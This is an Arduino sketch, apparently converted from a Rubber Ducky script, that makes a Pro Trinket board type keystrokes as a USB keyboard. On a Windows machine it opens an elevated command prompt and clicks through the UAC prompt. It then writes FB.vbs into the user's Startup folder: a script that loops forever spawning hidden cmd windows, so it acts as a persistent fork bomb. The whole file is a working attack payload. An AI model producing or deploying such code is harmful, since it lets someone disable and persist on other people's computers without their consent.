/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include <ProTrinketKeyboard.h>



/* Init function */
void setup()
{
  // Begining the Keyboard stream
  TrinketKeyboard.begin();

  // Wait 500ms
  delay(500);

  delay(1000);

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
  TrinketKeyboard.pressKey(0,0);

  delay(500);

  TrinketKeyboard.print(F("cmd"));

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_CONTROL, KEYCODE_MOD_LEFT_SHIFT, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  delay(400);

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_ALT, KEYCODE_Y);
  TrinketKeyboard.pressKey(0,0);
  
  delay(500);

  TrinketKeyboard.print(F("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\FB.vbs\""));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("do"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("CreateObject(\"Wscript.Shell\").Run \"cmd\", 0, False"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("loop"));

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_CONTROL, KEYCODE_Z);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  delay(50);

  TrinketKeyboard.print(F("start FB.vbs && exit"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  // Ending stream
//  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
